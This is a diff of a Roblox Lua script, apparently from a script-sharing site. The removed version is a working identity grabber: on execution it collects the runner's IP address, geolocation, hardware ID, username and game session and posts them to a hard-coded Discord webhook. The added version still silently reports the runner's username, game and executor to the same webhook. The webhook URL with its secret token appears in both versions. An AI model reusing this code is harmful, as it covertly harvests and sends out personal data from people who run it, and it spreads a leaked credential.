@@ -1,81 +1,83 @@
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
-
--- Player Info
-local LocalPlayer = Players.LocalPlayer
-local Userid = LocalPlayer.UserId
-local DName = LocalPlayer.DisplayName
-local Name = LocalPlayer.Name
-local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
-local AccountAge = LocalPlayer.AccountAge
-local Country = game.LocalizationService.RobloxLocaleId
-local GetIp = game:HttpGet("https://v4.ident.me/")
-local GetData = game:HttpGet("http://ip-api.com/json")
-local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
-local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
-
--- Game Info
-local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
-
--- Detecting Executor
-local function detectExecutor()
-    local executor = identifyexecutor()
-                    or "Unsupported"
-    return executor
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+function SendMessage(url, message)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["content"] = message
+    }
+    local body = http:JSONEncode(data)
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+    print("Sent")
 end
 
--- Creating Webhook Data
-local function createWebhookData()
-    local webhookcheck = detectExecutor()
-    
+function SendMessageEMBED(url, embed)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
     local data = {
-        ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
-        ["content"] = "",
         ["embeds"] = {
             {
-                ["author"] = {
-                    ["name"] = "Someone executed your script",
-                    ["url"] = "https://roblox.com",
-                },
-                ["description"] = string.format(
-                    " **\n**Username:** %s \n**User Id:** %d" ..
-                    "\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
-                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
-                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
-                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
-                    Name, Userid, Country, GetIp, GetHwid,
-                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
-                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
-                    GetData, ConsoleJobId
-                ),
-                ["type"] = "rich",
-                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
-                ["thumbnail"] = {
-                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
-                },
+                ["title"] = embed.title,
+                ["description"] = embed.description,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+                ["footer"] = {
+                    ["text"] = embed.footer.text
+                }
             }
         }
     }
-    return HttpService:JSONEncode(data)
+    local body = http:JSONEncode(data)
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+    print("Sent")
 end
 
--- Sending Webhook
-local function sendWebhook(webhookUrl, data)
-    local headers = {
-        ["content-type"] = "application/json"
+
+--Examples 
+
+local url = "https://discord.com/api/webhooks/1318977897108602880/Stmlnl0cq59p16GpM7i4ehhGUoupvWOYef2DBGdLk2D9tGZXBPzfLtDfJyc6yBkpwqIV"
+
+local placeid = game.PlaceId
+local player = game:GetService("Players").LocalPlayer
+local MarketplaceService = game:GetService("MarketplaceService")
+local gamename = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+local embed = {
+    ["title"] = "Script Got Executed",
+    ["description"] = "",
+    ["color"] = 65280,
+    ["fields"] = {
+        {
+            ["name"] = "Game:",
+            ["value"] = "https://www.roblox.com/games/"..tostring(placeid).."\n"..tostring(gamename)
+        },
+        {
+            ["name"] = "Username:",
+            ["value"] = tostring(player)
+        },
+        {
+            ["name"] = "Executor:",
+            ["value"] = tostring(identifyexecutor())
+        },
+
+    },
+    ["footer"] = {
+        ["text"] = "This is the footer text"
     }
-
-    local request = http_request or request or HttpPost or syn.request
-    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
-    request(abcdef)
-end
-
--- Replace the webhook URL with your own URL
-local webhookUrl = "https://discord.com/api/webhooks/1318977897108602880/Stmlnl0cq59p16GpM7i4ehhGUoupvWOYef2DBGdLk2D9tGZXBPzfLtDfJyc6yBkpwqIV"
-local webhookData = createWebhookData()
-
--- Sending the webhook
-sendWebhook(webhookUrl, webhookData)
-
-
+}
+SendMessageEMBED(url, embed)
